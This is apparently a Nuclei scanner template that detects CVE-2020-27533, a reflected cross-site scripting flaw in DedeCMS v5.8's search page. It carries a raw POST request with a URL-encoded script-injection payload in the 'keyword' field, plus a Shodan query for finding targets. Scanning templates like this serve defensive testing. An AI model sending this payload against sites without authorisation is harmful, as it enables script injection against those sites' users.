id: CVE-2020-27533

info:
  name: DedeCMS v.5.8 - "keyword" Cross-Site Scripting
  author: ritikchaddha
  severity: medium
  description: A Cross Site Scripting (XSS) issue was discovered in the search feature of DedeCMS v.5.8 that allows malicious users to inject code into web pages, and other users will be affected when viewing web pages.
  reference:
    - https://sploitus.com/exploit?id=EDB-ID:48974
    - https://www.exploit-db.com/exploits/48974
    - https://nvd.nist.gov/vuln/detail/CVE-2020-27533
  metadata:
    shodan-query: http.component:"DedeCMS"
  tags: dedecms,xss,cve,cve2022

requests:
  - raw:
      - |
        POST /src/dede/action_search.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        keyword=%22%3e%3c%2f%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%64%6f%63%75%6d%65%6e%74%2e%64%6f%6d%61%69%6e%29%3c%2f%73%63%72%69%70%74%3e

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "</script><script>alert(document.domain)</script>"

      - type: word
        part: header
        words:
          - text/html

      - type: status
        status:
          - 200
